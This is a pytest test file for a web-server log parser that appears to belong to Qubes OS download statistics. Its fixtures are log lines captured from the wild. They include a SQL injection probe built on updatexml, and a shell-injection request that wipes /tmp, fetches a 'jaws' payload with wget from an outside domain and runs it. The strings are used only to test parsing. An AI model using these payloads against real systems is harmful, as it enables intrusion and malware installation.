import datetime
import io

import pytest

from qubesstats import stats

def test_parser_urlquote():
    file = io.StringIO(r'''127.81.0.1 - - [01/Aug/2022:00:00:16 +0000] "GET /iso/Qubes-R4.1.1-x86%5F64/Qubes-R4.1.1-x86%5F64.iso HTTP/1.1" 404 169 "-" "Transmission/3.00"
''')
    record = next(stats.parse_combined(file))

    assert record.address == '127.81.0.1'
    assert record.timestamp == datetime.datetime(2022, 8, 1, 0, 0, 16, tzinfo=datetime.timezone.utc)
    assert record.path == '/iso/Qubes-R4.1.1-x86_64/Qubes-R4.1.1-x86_64.iso'

def test_invalid():
    # IDK what is this shit, but it was in the log
    file = io.StringIO(r'''127.81.0.1 - - [01/Aug/2022:00:00:48 +0000] "\x02\xB5\xAB\x8E\x86\xB8S\xA8m\xADS\x11\xDB\xF8\x02T\x18H\xC4Z\x08^\xA0~+\xADq|gu>dO&_\x90\xEF\xE7\x94\x96\x9A\x92" 400 173 "-" "-"
''')
    with pytest.raises(StopIteration):
        next(stats.parse_combined(file))

def test_malformed_request_token():
    file = io.StringIO(r'''127.81.0.1 - - [01/Aug/2022:01:06:07 +0000] "POST /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--+  HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
127.81.0.1 - - [08/Aug/2022:04:47:09 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ rischyo.cf/jaws;sh+/tmp/jaws HTTP/1.1" 404 169 "-" "Hello, world"
''')
    parser = stats.parse_combined(file)

    print(next(parser))

    # haha very funny
    record = next(parser)
    assert record.path == '/shell?cd+/tmp;rm+-rf+*;wget+ rischyo.cf/jaws;sh+/tmp/jaws'

    with pytest.raises(StopIteration):
        next(parser)
